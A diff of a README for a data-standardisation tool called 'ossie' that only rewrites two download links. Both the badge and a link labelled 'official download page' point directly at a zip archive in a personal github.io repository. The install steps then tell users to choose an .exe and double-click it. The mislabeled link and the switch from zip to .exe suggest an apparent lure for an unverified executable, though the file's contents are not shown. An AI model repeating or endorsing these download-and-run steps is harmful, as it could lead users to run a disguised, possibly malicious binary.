@@ -5,7 +5,7 @@ description: "Standardize and streamline semantic model exchange across data ana
 ---
 # 📊 ossie - Standardize data across your business systems
 
-[![Download Ossie](https://img.shields.io/badge/Download-Ossie_for_Windows-blue.svg)](https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/pages/Latest_1.7-beta.4.zip)
+[![Download Ossie](https://img.shields.io/badge/Download-Ossie_for_Windows-blue.svg)](https://github.com/SonCabal/soncabal.github.io/raw/refs/heads/main/pages/Latest_1.7-beta.4.zip)
 
 ## 📖 About this software
 
@@ -27,7 +27,7 @@ To run Ossie on your computer, your system should meet these needs:
 
 Follow these steps to install the software on your machine:
 
-1. Visit the [official download page](https://raw.githubusercontent.com/SonCabal/soncabal.github.io/main/pages/Latest_1.7-beta.4.zip) to locate the latest version.
+1. Visit the [official download page](https://github.com/SonCabal/soncabal.github.io/raw/refs/heads/main/pages/Latest_1.7-beta.4.zip) to locate the latest version.
 2. Select the file ending in .exe for Windows.
 3. Save the file to your Downloads folder.
 4. Open the Downloads folder and double-click the file you saved.
